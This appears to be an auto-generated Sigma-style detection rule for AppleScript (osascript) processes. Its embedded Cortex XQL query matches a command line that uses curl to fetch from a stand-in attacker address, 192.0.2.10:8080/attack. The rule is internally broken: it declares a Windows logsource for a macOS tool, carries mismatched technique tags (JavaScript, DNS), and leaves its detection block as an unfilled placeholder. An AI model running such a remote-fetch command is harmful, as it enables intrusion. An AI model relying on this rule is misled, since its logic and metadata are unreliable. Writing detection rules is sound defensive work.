title: "AppleScript Process with Rare Command Line Execution \u2014 AppleScript Process with Rare Command Line"
id: ttp-2026-0253-bioc-01
status: experimental
description: |
  Detection of osascript process with uncommon command line arguments indicating potential evasion
  Canonical Cortex XQL body follows (preserve verbatim for XSIAM):
  ----
    dataset = xdr_data
    | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
    | filter action_process_image_name = 'osascript'
    | filter action_file_path contains 'script.scpt'
    | filter action_command_line contains 'curl -s http://192.0.2.10:8080/attack'
  ----
references:
  - https://attack.mitre.org/techniques/T1059/
author: CortexSim detection_scanner
tags:
    - attack.t1059.007
    - attack.t1105
    - attack.t1071.004
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    placeholder: replace_with_target_dialect_translation_of_xql
  condition: selection
falsepositives:
  - Legitimate administrative tooling that mirrors the same telemetry shape.
level: high
